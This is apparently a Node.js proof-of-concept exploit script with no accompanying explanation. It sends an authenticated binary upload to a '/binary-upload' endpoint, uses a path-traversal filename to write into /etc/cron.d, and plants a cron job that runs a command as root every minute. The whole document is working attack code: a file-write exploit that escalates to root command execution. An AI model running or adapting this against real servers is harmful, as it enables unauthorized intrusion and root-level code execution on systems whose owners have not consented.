const endpoint = process.argv[2];
const session = process.argv[3];
const filename = Buffer.from("../../../../../etc/cron.d/nightly_probe", "utf8");
const body = Buffer.from("* * * * * root id > /tmp/account_proof\n", "utf8");
const header = Buffer.alloc(20);
[1, 1, 1, body.length, filename.length].forEach((value, i) => {
  header.writeUInt32BE(value, i * 4);
});
fetch(endpoint + "/binary-upload", {
  method: "POST",
  headers: {"Content-Type": "application/octet-stream", Cookie: "JSESSIONID=" + session},
  body: Buffer.concat([header, filename, body])
});
